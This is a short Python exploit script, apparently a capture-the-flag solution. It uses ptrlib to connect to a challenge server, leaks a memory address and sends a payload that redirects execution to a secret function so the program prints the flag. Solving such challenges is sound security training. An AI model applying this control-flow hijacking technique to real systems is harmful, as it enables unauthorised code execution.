from ptrlib import *

exe = ELF("./main")

# p = Process("./main")
p = Socket("challs.breachers.in", "1339")


def enter_vault_pin(pin):
    p.sendlineafter(b"Enter your choice: ", b"1")
    p.sendlineafter(b"Enter Vault PIN: ", pin)


def view_security_log():
    p.sendlineafter(b"Enter your choice: ", b"2")
    return p.recvline()


def trigger_alarm():
    p.sendlineafter(b"Enter your choice: ", b"3")
    return p.recvline()


def enter_backup_vault_pin():
    p.sendlineafter(b"Enter your choice: ", b"4")


def view_backup_vault_log():
    p.sendlineafter(b"Enter your choice: ", b"5")


def trigger_backup_vault_alarm():
    p.sendlineafter(b"Enter your choice: ", b"6")


pin_addr = int(view_security_log().strip().decode(), 16)
logger.info(f"Vault PIN address: {hex(pin_addr)}")

payload = p64(exe.symbol("_Z12secretAccessv")) + b"A" * 16 + p64(pin_addr)
enter_vault_pin(payload)

enter_backup_vault_pin()
logger.info(f"Flag is: {p.recvline().strip().decode()}")
